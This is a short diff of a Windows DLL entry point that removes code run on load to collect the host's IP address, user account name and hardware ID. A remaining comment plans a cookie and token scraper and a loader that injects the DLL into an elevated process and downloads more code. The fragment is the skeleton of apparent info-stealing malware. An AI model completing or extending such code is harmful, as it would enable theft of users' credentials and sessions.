@@ -1,6 +1,5 @@
 #include <Windows.h>
 #include "Server/Server.h"
-#include <Fetch/Fetch.h>
 
 /*TO DO : Establish a connection from client to server and make a cookie / token scraper
  Make our loader that will load this dll into an elevated process and also download a new 
@@ -13,11 +12,6 @@ BOOL APIENTRY Entry(
 {
 	switch (ul_reason_for_call) {
 	case DLL_PROCESS_ATTACH:
-
-		Fetch fetch;
-		fetch.network().ip();
-		fetch.user().get_account_name();
-		fetch.hardware().id();
 
 		break;
 	case DLL_THREAD_ATTACH:
